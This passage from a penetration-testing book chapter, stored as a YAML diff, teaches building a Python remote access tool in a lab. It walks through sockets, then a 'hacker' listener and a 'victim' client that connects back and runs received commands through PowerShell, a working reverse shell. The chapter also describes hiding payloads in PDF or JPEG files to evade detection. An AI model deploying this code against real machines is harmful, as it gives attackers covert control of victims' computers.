@@ -1,0 +1,1222 @@
+- en: '*Chapter 6*: Malware Development'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In previous chapters, we have learned how to gather information pertaining to
+    the user and how this information can be used to attack the victim. In this chapter,
+    we will move toward a new dimension and develop a **Remote Access Tool** (**RAT**).
+    RATs allow pen testers to gain access to victims' computers remotely and are widely
+    used in the field of cybersecurity. There are much more advanced RAT programs
+    available on the internet. However, the goal of this chapter is to help you build
+    your own RAT, which will give you far more advanced control.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we will cover the following topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Introduction to RATs
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Socket programming in Python
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Creating malware
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Running commands remotely on the victim
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Understanding RATs
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: RATs have been widely used in cybersecurity and there are a lot of popular RATs
+    available. Some hackers even offer customized and hard-to-detect RATs to be used
+    to gain access to a victim's computer. In its simplest form, an RAT is a program
+    that creates a network connection with another computer and performs an action.
+    RATs can be legitimate software, such as a common commercial software such as
+    TeamViewer, which is often used by IT professionals to diagnose remote computers
+    and to detect problems. However, these programs can also be used by hackers to
+    get control of the victim's machine, so you should be very careful in how you
+    use these programs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In its simplest form, an RAT is a pair of programs. One program runs on the
+    victim, while the other program runs on the attacker''s machine. There are two
+    main configurations in which these programs work depending on who initiates the
+    communication. These are defined as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: A program in which the attacker initiates the connection, called a **forward
+    connection**
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: A program that causes the victim's machine to create a connection to the hacker's
+    machine, called a **reverse connection**
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Let's look at these in detail in the following sections.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Forward shell
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: In modern computer systems, a forward connection is almost impossible since
+    the security configuration of most PCs does not allow remote devices to initiate
+    a connection unless there are specific rules mentioned in the firewall. By default,
+    all incoming connections are blocked by the firewall. These connections are only
+    possible if an open port is present in the victim's machine that can be exploited
+    by the hacker. However, you will find that this is not the case in most typical
+    scenarios.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Reverse shell
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: A reverse shell employs the opposite approach. Instead of the attacker initiating
+    a connection to the victim, the attacker would plant a malware/**payload** (code
+    that executes on the victim's machine). In this way, instead of an external connection,
+    an internal connection from the victim would be initiated, which makes it much
+    more difficult for **Intrusion Detection Systems** (**IDSes**) such as firewalls
+    and antivirus programs to detect malicious activity on the system. The way this
+    kind of attack is deployed is that the attacker sends a malicious file containing
+    malware to the victim embedded in a PDF or JPEG file, for example. To the victim,
+    it would look like an ordinary file, but when the victim clicks on the file to
+    open it, a script is executed in the background that initiates a connection back
+    to the attacker. Once the connection to the attacker is established, the attacker
+    can easily take control of the victim's machine and execute commands remotely
+    on the victim's machine. Now that we have understood forward shells and reverse
+    shells, let's move on to discuss sockets in Python.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Socket programming in Python
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Before learning about malware development, it is necessary that we learn about
+    network programming in Python and how we can create network applications. The
+    first step in learning network programming is to learn about what we call *sockets*.
+    Sockets provide a fundamental mechanism for creating network-based applications
+    and our malware is going to be essentially a network application. Let's start
+    by understanding sockets first.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Sockets
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Before we jump into socket programming, let''s first understand what a network
+    socket is and how it can be used to develop network-based applications. As we
+    learned in previous chapters, the topmost layer in a network stack is an application
+    layer. These are the applications that the user interacts with in everyday life.
+    Now, the question is, how do these applications, which are developed in different
+    programming languages, communicate over the network? The answer lies in the use
+    of sockets. A socket is defined here: [https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html](https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: A socket is one endpoint of a two-way communication link between two programs
+    running on the network. A socket is bound to a port number so that the TCP layer
+    can identify the application that data is destined to be sent to.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Sockets are generally used in client-server communication, where one node is
+    a client initiating a connection, while the other node is a server responding
+    to that connection. At each end of the connection, each process, such as a network
+    initiation program or a network responding program, will employ a socket. A socket
+    is typically identified by an IP address concatenated with a port number. In a
+    typical scenario, a server usually listens on a certain port for incoming connection
+    requests from clients. Once a client request arrives, the server accepts the request
+    and initiates a socket connection with the client.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Servers implementing specific services, such as **HTTP**, **FTP**, and **telnet**,
+    listen on popular well-known ports such as **80**, **21**, and **23**. Ports from
+    **1**-**1024** are regarded as well-known ports and should not be used in implementing
+    your own programs as they are already reserved. Let's try to understand how sockets
+    work in Python and, in the next section, we will learn how we can use this to
+    our advantage to create our malware program.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Creating a socket in Python
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: To create a socket in Python, we can utilize the **socket** library. This library
+    is part of Python's standard package, so we don't need to install anything.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This module can be imported by simply typing the following code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let's take a look at the **Application Programming Interface** (**API**) of
+    this module. An API is a software interface to a code base that lets you access
+    the functionality of the code with some level of abstraction.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.socket() API
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'To create a socket object, we can make use of the following function, called
+    **socket()**. Let''s take a look at the parameters of this method. To see what
+    parameters are available for a function in VS Code, you can simply write the function
+    name and then, using VS Code Intelli Sense technology (which helps you write code
+    and helps you with suggestions), you can see what parameters are required. To
+    access this menu, if you just put your cursor on the name of the function, a small
+    popup will appear, indicating the parameters required by this method. If you want
+    to see the detailed implementation of this method, you can right-click on the
+    name of the **socket** function and select **Go to definition**. This will open
+    a file where this method is defined. Be careful not to change anything here. If
+    you are not using VS Code, you can read the documentation relating to the Python
+    socket module here: [https://docs.python.org/3/library/socket.html](https://docs.python.org/3/library/socket.html).
+    The implementation of this method will look like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.1 – Socket class constructor'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_01.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.1 – Socket class constructor
+  prefs: []
+  type: TYPE_NORMAL
+- en: The preceding screenshot shows that a socket is a class, and its constructor
+    requires family, type, and proto parameters. We will discuss these parameters
+    when we start building our programs in the next section of this chapter. For now,
+    you just need to understand that calling the constructor of this **socket** class
+    returns a socket object that can be used to communicate with other devices.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.bind() API
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Once you have created a socket object, to create a server, you need to bind
+    a socket to the IP address and port that the socket will utilize for communication.
+    Note that this function is only used when creating a **server** program. For servers,
+    these must be explicitly assigned since the server has to listen for incoming
+    connections on a specified port. In the case of a client, the IP and port are
+    automatically assigned, so you will not use this function.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.listen() API
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The **socket.listen()** method is used by servers to listen for any incoming
+    connection as per the configuration assigned in the **socket.bind()** method.
+    In other words, it waits for any connection attempt to the specified IP on the
+    specified port. This requires a queue size for the number of connections to be
+    held in a queue before it starts rejecting connections. For example, **socket.listen(5)**
+    means that it will allow five connections at a time.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.accept() API
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: As the name indicates, the **socket.accept()** API accepts connections made
+    by clients. This is a **blocking function** call, which means that program execution
+    will pause here until a connection is successfully made. Once a connection is
+    made, execution of the program will continue.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.connect()
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: As we have seen that **socket.accept()** blocks execution until a client connects,
+    the question now arises, how do clients connect? This is where **socket.connect()**
+    comes into play. This method initiates a connection to the server and if a server
+    is waiting for incoming connections, communication will follow. When a call to
+    **socket.connect()** happens, **socket.accept()** gets unblocked in the server
+    and execution of the program continues. Don't worry if this all seems very confusing
+    to you at the moment as to which functions are called in the server, and which
+    functions in the client. You will get a clear idea of this when we build examples.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.send()
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Once the connection is made between the server and client programs, the most
+    important part of the program comes, which is to send data over these connections.
+    This is where most of the user-defined logic will reside. The **socket.send()**
+    method is used to send bytes over the network. Note that the input to this function
+    is bytes, so any data you want to send over this connection should be in the form
+    of bytes. It is the responsibility of the user to encode the appropriate data
+    into bytes and to decode at the receiving end.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Socket.recv()
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: This method, as the name suggests, is used to receive bytes once the user sends
+    the data. Note that every call to the send or receive methods should be handled
+    properly. For example, if the server is sending data, the client should be ready
+    to receive this data and vice versa. The input to this method is the number of
+    bytes you want to receive at once. This is the buffer created by the program to
+    temporarily store data, and once a certain number of bytes arrive, they can be
+    read, and the buffer is ready for the next cycle.
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket.close()
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Once you have done everything you wanted to do with a program, you must close
+    the socket so that the port can become available to other programs to be used.
+    Note that even if you don't close the socket properly, it will be released by
+    your operating system after a period of time once your program exits or your computer
+    restarts. However, it is always a good idea to close these sockets manually inside
+    the program. If the program exits and the socket is not closed properly, any incoming
+    requests may be blocked, or the operating system may refuse to use this socket
+    for the next program because it may think that the port is still in use.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Fitting it altogether
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Until now, we have learned different methods of the socket API, but to get
+    a clear understanding of how and where each function is used, I will summarize
+    everything here. We will have two programs running separately. One will be the
+    server listening for incoming connections, and the other will be the client trying
+    to make a connection. Let''s take a look at the following diagram to see how things
+    fit together in the socket API:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.2 – Client and server socket usage in Python'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_02.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.2 – Client and server socket usage in Python
+  prefs: []
+  type: TYPE_NORMAL
+- en: The diagram shows two separate programs running concurrently, namely, the client
+    and server. You may be wondering how this client and server relate to our hacking
+    purposes? Well, we will use a similar approach to develop our malware. We will
+    write two programs. One program will run on the hacker's machine, we will call
+    this the server/hacker program, and the other will run on the client; we will
+    refer to this as the victim program. The victim program will try to connect with
+    the hacker program. This way, since the connection is originating from the victim's
+    machine, the antivirus or IDS will not block it. In this section, we have learned
+    how socket programming in Python works. We didn't go into much detail in terms
+    of how we create these programs. In the next section, we will make use of this
+    socket API to create our victim and the hacker parts of the malware.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Creating malware
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Now that we have seen what the outline of our malware program will look like,
+    let's start writing our hacker and victim programs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Hacker server
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: In this section, we will write a program for the hacker server, which will constantly
+    listen for incoming connections originating from the victim's machine to the hacker.
+    Let's go to our Kali machine and create a new project called **hacker server**.
+    Also, create a new virtual environment, as we have done in previous chapters.
+    We will not require any external library in this section, but it is always a good
+    idea to use virtual environments to keep track of dependencies in our program.
+    Also, create a new file called **server.py**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The IP address of our Kali machine is **192.168.74.128**, and for the victim''s
+    Windows machine, it is **192.168.74.129**. Next, we need to select which port
+    we will be listening on for incoming connections. You can select any port above
+    **1024** and less than **65355**. However, we will use port number **8008**. This
+    will be the port we bind the server to, and if the client wants to connect with
+    the server, it needs to use this port. Let''s import the socket module and create
+    a socket object. Take a look at the following code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: Here, on the first line, we are simply importing the **socket** module from
+    the Python standard library. Next, we are creating a socket object. The two parameters
+    are **socket.AF_INET** and **socket.SOCK_STREAM**. Let's see what they mean. Remember
+    that we talked about the IPv4 and IPv6 addresses? This is exactly what **socket.AF_INET**
+    means. We are using IPv4, which is denoted by **socket.AF_INET**. If you want
+    to use IPv6 (which you probably won't), you can select **socket.AF_INET6**. Next,
+    we need to define what network layer protocol we want to use. Here, we have options
+    for either TCP or UDP. In our examples, we want to use a reliable connection,
+    so we will choose TCP. **socket.SOCK_STREAM** means that we are creating a TCP
+    socket. If you want to create a UDP socket (which, again, you probably won't for
+    the most part), you can use **socket.SOCK_DGRAM**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we will bind this server to the Kali''s IP address and port **8008**:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: Port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket_address = (IP, Port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.bind(socket_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note that you have to give the IP address and port in *tuple* form to the **socket.bind()**
+    method.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we need to listen for incoming connections on the specified socket with
+    the help of the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.listen(5)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that our program configuration is almost complete, we can start listening
+    for incoming connection requests:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.listen(5)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("listening for incoming connection requests")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket, client_address = hacker_socket.accept()
+  prefs: []
+  type: TYPE_NORMAL
+- en: Execution of the program will pause here. Once the client has connected, this
+    method will return two parameters. The first is **hacker_socket**, which we can
+    use to send and receive data, and the second is the address of the victim. This
+    will help the program to know which client is connected.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once the connection has been accepted, we can use this socket to send a message
+    over the network. As mentioned earlier, the accept function is blocking, which
+    means that execution is paused here until someone connects. To demonstrate this,
+    let''s run the program. You will see the following output:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.3 – Waiting for incoming connections'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_03.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.3 – Waiting for incoming connections
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You will see that programs don''t move past this step. You can press *Ctrl
+    + C* to exit the program. Now, let''s try to send a simple message from the *hacker*
+    to the victim. For now, we will send a simple string, but in later sections, we
+    will send more advanced data, such as files:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: message = "Message from hacker"
+  prefs: []
+  type: TYPE_NORMAL
+- en: message_bytes = message.encode()
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(message_byte)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("Message sent from hacker")
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **message.encode()** method converts the message string into bytes, as the
+    **socket.send()** method only accepts bytes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Finally, we will close this socket by calling the **close()** method.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The complete code for the hacker program is shown as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket = socket.socket(socket.AF_INET,     socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: Port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket_address = (IP, Port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.bind(socket_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.listen(5)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("listening for incoming connection requests")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket, client_address = hacker_socket.accept()
+  prefs: []
+  type: TYPE_NORMAL
+- en: message = "Message from hacker"
+  prefs: []
+  type: TYPE_NORMAL
+- en: message_bytes = message.encode()
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(message_bytes)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("Message sent")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.close()
+  prefs: []
+  type: TYPE_NORMAL
+- en: Our hacker program is now complete. Next, we will move to the victim program,
+    which will initiate a connection with the hacker.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Victim's client
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Go to the Windows 10 machine and create a new project for the victim. The first
+    few steps will be similar to the hacker program. Take a look at the following
+    code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_address = (hacker_IP, hacker_port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: Since we want to connect to the hacker, we will provide the hacker's IP and
+    the corresponding port the hacker is listening on.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, we will create a tuple for **hacker_address**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The next step is to **connect()** with the hacker using the victim''s socket:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.connect(hacker_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once this method is called, if the server is listening, we will have a successful
+    connection established, otherwise we will see an error message. If you run the
+    program now, you will see a connection refused message:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.4 – Connection failure'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_04.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.4 – Connection failure
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This is because, if there is no server listening on a certain port, all incoming
+    traffic is blocked by default. Remember that in our hacker program, we were sending
+    a message? We need to handle that message here, otherwise we would run into errors.
+    We can use the **recv** method to receive messages:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: data = victim_socket.recv(1024)
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**1024** is the number of bytes the socket can read at once. Any data more
+    than this number coming from the hacker will be truncated. We can use loops to
+    receive more data. For now, this number would be enough.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Finally, since we receive the data in the form of bytes, we need to decode
+    them into a string to print them and later use them in the program if we want:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(data.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.close()
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can close the socket using the **close()** method. The complete program
+    is as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_address = (hacker_IP, hacker_port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.connect(hacker_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: data = victim_socket.recv(1024)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(data.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.close()
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now our hacker and victim programs are complete in their simplest form. A hacker
+    is listening for incoming connections, and the victim tries to connect with the
+    hacker program. Once the connection is established, the hacker sends a message
+    to the victim. The victim receives the message and simply prints it. Both parties
+    then close their respective connections. What we have learned so far is generic
+    socket programming. Once we understand how we can create connections between two
+    devices in a network, we can adopt these programs to create malicious programs
+    that can allow hackers to perform malicious activities on the victim's computer.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let''s tie all this together. First, run the hacker program and then run the
+    victim''s program. This time, the connection will be properly established and,
+    on the hacker''s machine, you will see the following output:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.5 – Hacker''s program'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_05.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.5 – Hacker's program
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Similarly, the victim will receive the message and display it on screen:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 6.6 – Message received by the victim'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](image/B14788_06_06.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 6.6 – Message received by the victim
+  prefs: []
+  type: TYPE_NORMAL
+- en: We have completed one part of the puzzle, which is to create a successful connection
+    from the victim's machine to the hacker's machine, and received a small message
+    at the victim's machine, sent by the hacker. This may not seem like a big task,
+    but this is a very powerful tool. Using this, you can essentially take commands
+    from the hacker. Design the victim program to run these commands on the machine
+    and send the results back to the hacker. In the next section, we will learn how
+    to send commands from the hacker's machine to the victim's machine and send the
+    results back to the hacker.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Running commands remotely on the victim's machine
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We have already seen in [*Chapter 3*](B14788_03_Final_JC_ePub.xhtml#_idTextAnchor070),
+    *Reconnaissance and Information Gathering* (in the *Creating a Python script*
+    section), how to run commands on a computer using Python. We will build on that
+    knowledge to create a malware that will take commands and execute them on a victim's
+    machine. Our previous program just sends one message to the victim and exits.
+    This time, we will modify the program to do much more than that.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Open a new project on the Kali machine to execute commands on the victim''s
+    machine and create a new file. Let''s start by establishing a connection:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: Port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket_address = (IP, Port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.bind(socket_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.listen(5)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("listening for incoming connection requests")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket, client_address = hacker_socket.accept()
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The next step involves taking the user input for the command we want to run
+    on the victim''s machine. Once this input is taken, we must convert it into bytes
+    and send it over the connection to the victim program:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command = input("Enter the command ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(command.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once the command is sent, the victim side program will take care of executing
+    it and return the result. Here, on the hacker program, we will simply receive
+    whatever is returned by the victim and print it as a result:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = hacker_socket.recv(1048)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(command_result.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we will put this inside a loop and put an exit condition as well:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command = input("Enter the command ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(command.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if command == "stop":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: break
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = hacker_socket.recv(1048)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(command_result.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The **if** statement makes sure that we can safely exit this loop when we want
+    so that we don''t get stuck in an infinite loop. Also, to make sure that we close
+    the socket properly if we encounter any error during execution, we will add a
+    **try-catch** block for exception handling. The complete hacker program for executing
+    commands looks like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: Port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: socket_address = (IP, Port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.bind(socket_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.listen(5)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("listening for incoming connection requests")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket, client_address = hacker_socket.accept()
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("connection established with ", client_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'try:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'while True:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: command = input("Enter the command ")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.send(command.encode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if command == "stop":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: break
+  prefs: []
+  type: TYPE_NORMAL
+- en: command_result = hacker_socket.recv(1048)
+  prefs: []
+  type: TYPE_NORMAL
+- en: print(command_result.decode())
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'except Exception:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: print("Exception occured")
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_socket.close()
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'On the victim side, we will receive the command that the hacker sends and use
+    the **subprocess** module to execute commands, and finally send the results back
+    to the hacker. This part will be coded on the Windows 10 machine. Let''s create
+    a new project on the Windows machine and try to follow the same steps for creating
+    a connection with the hacker program:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: import socket
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if __name__ == "__main__":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_IP = "192.168.74.128"
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_port = 8008
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_address = (hacker_IP, hacker_port)
+  prefs: []
+  type: TYPE_NORMAL
+- en: victim_socket.connect(hacker_address)
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As we have seen on the hacker program that we have a **while** loop to send
+    commands continuously, we will deploy a similar approach here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: data = victim_socket.recv(1024)
+  prefs: []
+  type: TYPE_NORMAL
+- en: hacker_command = data.decode()
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We will add a similar exit condition here, as we did in the hacker program:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'if hacker_command == "stop":'
+  prefs: []
+  type: TYPE_NORMAL
+- en: break
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we run the command on the victim computer and obtain a result in string
+    format as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**powershell.exe** makes sure that we run commands using PowerShell in Windows.
+    **capture_output=True** makes sure that we receive a result in the **output**
+    variable.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we need to check for errors. If any error occurs during execution of
